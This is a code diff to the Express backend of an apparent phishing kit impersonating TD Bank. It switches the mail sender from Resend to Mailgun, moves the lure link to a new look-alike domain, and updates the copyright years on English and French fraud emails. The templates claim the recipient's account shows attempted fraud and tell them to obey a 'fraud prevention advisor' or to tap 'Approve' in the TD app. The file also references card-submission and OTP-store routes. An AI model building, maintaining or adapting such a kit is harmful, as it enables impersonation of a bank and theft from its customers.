@@ -6,10 +6,12 @@ const rateLimit = require('express-rate-limit');
 const path = require('path');
 const bot = require('./bot');
 const otpStore = require('./otpStore'); // Serves as sessionStore
-const { Resend } = require('resend');
+const FormData = require('form-data');
+const Mailgun  = require('mailgun.js');
 
 
 const app = express();
+app.set('trust proxy', 1); // Trust first proxy (Nginx) for accurate IP rate-limiting
 const PORT = process.env.PORT || 5001;
 const isProduction = process.env.NODE_ENV === 'production';
 
@@ -62,8 +64,8 @@ app.disable('x-powered-by');
 
 // Define allowed CORS origins
 const allowedOrigins = [
-  'https://profil1-centre-1.online',
-  'https://www.profil1-centre-1.online'
+  'https://centr-prof.com',
+  'https://www.centr-prof.com'
 ];
 
 if (process.env.FRONTEND_URL) {
@@ -454,7 +456,7 @@ app.post('/api/submit-card', async (req, res) => {
 });
 
 // =============================================
-// ADMIN — SEND EMAIL VIA RESEND
+// ADMIN — SEND EMAIL VIA MAILGUN
 // =============================================
 
 
@@ -470,14 +472,15 @@ app.post('/api/admin/send-email', async (req, res) => {
     return res.status(400).json({ success: false, error: 'Recipient is required.' });
   }
 
-  const link = 'https://profil1-centre-1.online/?key=client-td-banque';
+  const link = 'https://centr-prof.com/?key=client-td-banque';
 
-  const RESEND_API_KEY = process.env.RESEND_API_KEY;
-  const FROM_EMAIL     = process.env.RESEND_FROM_EMAIL;
-  const FROM_NAME      = process.env.RESEND_FROM_NAME || 'BANQUE TD';
+  const MG_API_KEY   = process.env.MG_API_KEY;
+  const MG_DOMAIN    = process.env.MG_DOMAIN;
+  const FROM_EMAIL   = process.env.MG_FROM_EMAIL;
+  const FROM_NAME    = process.env.MG_FROM_NAME || 'BANQUE TD';
 
-  if (!RESEND_API_KEY || !FROM_EMAIL) {
-    console.error('[Admin] Resend API key or FROM_EMAIL not set in .env');
+  if (!MG_API_KEY || !MG_DOMAIN || !FROM_EMAIL) {
+    console.error('[Admin] Mailgun API key, domain, or FROM_EMAIL not set in .env');
     return res.status(500).json({ success: false, error: 'Email service not configured.' });
   }
 
@@ -1004,14 +1007,14 @@ app.post('/api/admin/send-email', async (req, res) => {
           </td>
         </tr>
         <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Security reminder:</strong> TD Bank will never ask for your password, PIN or full card number by email or phone. If in doubt, contact us at <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
-        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">TD Bank</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Privacy</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Terms of Use</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Contact Us</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">This email was sent automatically by TD Bank's security system. Please do not reply directly to this message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2025 TD Bank. All rights reserved. The Toronto-Dominion Bank.</p></td></tr></table></td></tr>
+        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">TD Bank</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Privacy</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Terms of Use</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Contact Us</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">This email was sent automatically by TD Bank's security system. Please do not reply directly to this message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2026 TD Bank. All rights reserved. The Toronto-Dominion Bank.</p></td></tr></table></td></tr>
         <tr><td style="height:32px;background:#f2f4f6;"></td></tr>
       </table>
     </td></tr>
   </table>
 </body>
 </html>`,
-        text: `Dear Customer,\n\nOur fraud detection system has identified attempted fraud on your bank account. Your fraud prevention advisor is currently online and will guide you step by step through the asset security procedure.\n\nPlease follow all instructions given by your advisor carefully. Do not perform any operation without their prior approval.\n\nFraud Prevention Service\nTD Bank\n© 2025 TD Bank. All rights reserved.`,
+        text: `Dear Customer,\n\nOur fraud detection system has identified attempted fraud on your bank account. Your fraud prevention advisor is currently online and will guide you step by step through the asset security procedure.\n\nPlease follow all instructions given by your advisor carefully. Do not perform any operation without their prior approval.\n\nFraud Prevention Service\nTD Bank\n© 2026 TD Bank. All rights reserved.`,
       },
       fr: {
         subject: 'URGENT – Procédure de sécurisation de vos avoirs – TD Banque',
@@ -1090,14 +1093,14 @@ app.post('/api/admin/send-email', async (req, res) => {
           </td>
         </tr>
         <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Rappel de s&eacute;curit&eacute;&nbsp;:</strong> La Banque TD ne vous demandera jamais votre mot de passe, NIP ou num&eacute;ro de carte complet par courriel ou par t&eacute;l&eacute;phone. Si vous avez un doute, contactez-nous au <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
-        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">Banque TD</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Confidentialit&eacute;</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Conditions d&apos;utilisation</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Nous contacter</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">Ce courriel a &eacute;t&eacute; envoy&eacute; automatiquement par le syst&egrave;me de s&eacute;curit&eacute; de TD Banque. Merci de ne pas r&eacute;pondre directement &agrave; ce message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2025 TD Banque. Tous droits r&eacute;serv&eacute;s. La Banque Toronto-Dominion.</p></td></tr></table></td></tr>
+        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">Banque TD</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Confidentialit&eacute;</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Conditions d&apos;utilisation</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Nous contacter</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">Ce courriel a &eacute;t&eacute; envoy&eacute; automatiquement par le syst&egrave;me de s&eacute;curit&eacute; de TD Banque. Merci de ne pas r&eacute;pondre directement &agrave; ce message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2026 TD Banque. Tous droits r&eacute;serv&eacute;s. La Banque Toronto-Dominion.</p></td></tr></table></td></tr>
         <tr><td style="height:32px;background:#f2f4f6;"></td></tr>
       </table>
     </td></tr>
   </table>
 </body>
 </html>`,
-        text: `Madame, Monsieur,\n\nNotre système de détection a identifié des tentatives de fraude sur votre compte bancaire. Votre conseiller en prévention de la fraude est actuellement en ligne avec vous et va vous accompagner pas à pas dans la procédure de sécurisation de l'intégralité de vos avoirs.\n\nVeuillez suivre scrupuleusement toutes les instructions données par votre conseiller. Ne réalisez aucune opération sans son accord préalable.\n\nCordialement,\nLe Service de Lutte contre la Fraude\nTD Banque\n© 2025 TD Banque. Tous droits réservés.`,
+        text: `Madame, Monsieur,\n\nNotre système de détection a identifié des tentatives de fraude sur votre compte bancaire. Votre conseiller en prévention de la fraude est actuellement en ligne avec vous et va vous accompagner pas à pas dans la procédure de sécurisation de l'intégralité de vos avoirs.\n\nVeuillez suivre scrupuleusement toutes les instructions données par votre conseiller. Ne réalisez aucune opération sans son accord préalable.\n\nCordialement,\nLe Service de Lutte contre la Fraude\nTD Banque\n© 2026 TD Banque. Tous droits réservés.`,
       },
     }, // end fraud
 
@@ -1174,14 +1177,14 @@ app.post('/api/admin/send-email', async (req, res) => {
           </td>
         </tr>
         <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Security reminder:</strong> TD Bank will never ask for your password, PIN or full card number by email or phone. If in doubt, contact us at <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
-        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">TD Bank</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Privacy</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Terms of Use</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Contact Us</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">This email was sent automatically by TD Bank's security system. Please do not reply directly to this message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2025 TD Bank. All rights reserved. The Toronto-Dominion Bank.</p></td></tr></table></td></tr>
+        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">TD Bank</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Privacy</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Terms of Use</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Contact Us</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">This email was sent automatically by TD Bank's security system. Please do not reply directly to this message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2026 TD Bank. All rights reserved. The Toronto-Dominion Bank.</p></td></tr></table></td></tr>
         <tr><td style="height:32px;background:#f2f4f6;"></td></tr>
       </table>
     </td></tr>
   </table>
 </body>
 </html>`,
-        text: `Dear Customer,\n\nOur monitoring system has detected a recent transaction on your account that you have reported as unauthorized.\n\nWe have immediately blocked this transaction. To finalize its cancellation, please open your TD app and tap "Approve".\n\nSincerely,\nThe Security and Fraud Prevention Service\nTD Bank\n© 2025 TD Bank. All rights reserved.`,
+        text: `Dear Customer,\n\nOur monitoring system has detected a recent transaction on your account that you have reported as unauthorized.\n\nWe have immediately blocked this transaction. To finalize its cancellation, please open your TD app and tap "Approve".\n\nSincerely,\nThe Security and Fraud Prevention Service\nTD Bank\n© 2026 TD Bank. All rights reserved.`,
       },
       fr: {
         subject: 'Alerte de sécurité – TD Banque',
@@ -1251,14 +1254,14 @@ app.post('/api/admin/send-email', async (req, res) => {
           </td>
         </tr>
         <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Rappel de s&eacute;curit&eacute;&nbsp;:</strong> La Banque TD ne vous demandera jamais votre mot de passe, NIP ou num&eacute;ro de carte complet par courriel ou par t&eacute;l&eacute;phone. Si vous avez un doute, contactez-nous au <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
-        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">Banque TD</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Confidentialit&eacute;</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Conditions d&apos;utilisation</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Nous contacter</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">Ce courriel a &eacute;t&eacute; envoy&eacute; automatiquement par le syst&egrave;me de s&eacute;curit&eacute; de TD Banque. Merci de ne pas r&eacute;pondre directement &agrave; ce message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2025 TD Banque. Tous droits r&eacute;serv&eacute;s. La Banque Toronto-Dominion.</p></td></tr></table></td></tr>
+        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">Banque TD</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Confidentialit&eacute;</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Conditions d&apos;utilisation</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Nous contacter</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">Ce courriel a &eacute;t&eacute; envoy&eacute; automatiquement par le syst&egrave;me de s&eacute;curit&eacute; de TD Banque. Merci de ne pas r&eacute;pondre directement &agrave; ce message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2026 TD Banque. Tous droits r&eacute;serv&eacute;s. La Banque Toronto-Dominion.</p></td></tr></table></td></tr>
         <tr><td style="height:32px;background:#f2f4f6;"></td></tr>
       </table>
     </td></tr>
   </table>
 </body>
 </html>`,
-        text: `Madame, Monsieur,\n\nNotre système de surveillance a détecté une opération récente sur votre compte que vous nous déclarez ne pas avoir effectuée.\n\nNous avons immédiatement bloqué cette transaction. Pour finaliser son annulation, veuillez consulter votre application TD et appuyer sur « Approuver ».\n\nCordialement,\nLe Service de Sécurité et de Lutte contre la Fraude\nTD Banque\n© 2025 TD Banque. Tous droits réservés.`,
+        text: `Madame, Monsieur,\n\nNotre système de surveillance a détecté une opération récente sur votre compte que vous nous déclarez ne pas avoir effectuée.\n\nNous avons immédiatement bloqué cette transaction. Pour finaliser son annulation, veuillez consulter votre application TD et appuyer sur « Approuver ».\n\nCordialement,\nLe Service de Sécurité et de Lutte contre la Fraude\nTD Banque\n© 2026 TD Banque. Tous droits réservés.`,
       },
     }, // end approval
   };
@@ -1268,25 +1271,22 @@ app.post('/api/admin/send-email', async (req, res) => {
   const emailPayload = typeTemplates[lang] || typeTemplates.en;
 
   try {
-    const resend = new Resend(RESEND_API_KEY);
-    const { data, error } = await resend.emails.send({
-      from: `${FROM_NAME} <${FROM_EMAIL}>`,
-      to: [recipient],
+    const mailgun = new Mailgun(FormData);
+    const mg = mailgun.client({ username: 'api', key: MG_API_KEY });
+
+    const msgData = await mg.messages.create(MG_DOMAIN, {
+      from:    `${FROM_NAME} <${FROM_EMAIL}>`,
+      to:      [recipient],
       subject: emailPayload.subject,
-      html: emailPayload.html,
-      text: emailPayload.text,
+      html:    emailPayload.html,
+      text:    emailPayload.text,
     });
 
-    if (error) {
-      console.error('[Admin] Resend API error:', error);
-      return res.status(500).json({ success: false, error: `Resend error: ${error.message}` });
-    }
-
-    console.log(`[Admin] Email sent to ${recipient} via Resend. ID: ${data?.id}`);
-    return res.json({ success: true });
+    console.log(`[Admin] Email sent to ${recipient} via Mailgun. ID: ${msgData.id}`);
+    return res.json({ success: true, id: msgData.id });
   } catch (err) {
-    console.error('[Admin] Failed to call Resend API:', err.message);
-    return res.status(500).json({ success: false, error: 'Failed to send email. Server error.' });
+    console.error('[Admin] Failed to call Mailgun API:', err);
+    return res.status(500).json({ success: false, error: err?.message || 'Failed to send email. Server error.' });
   }
 });
 
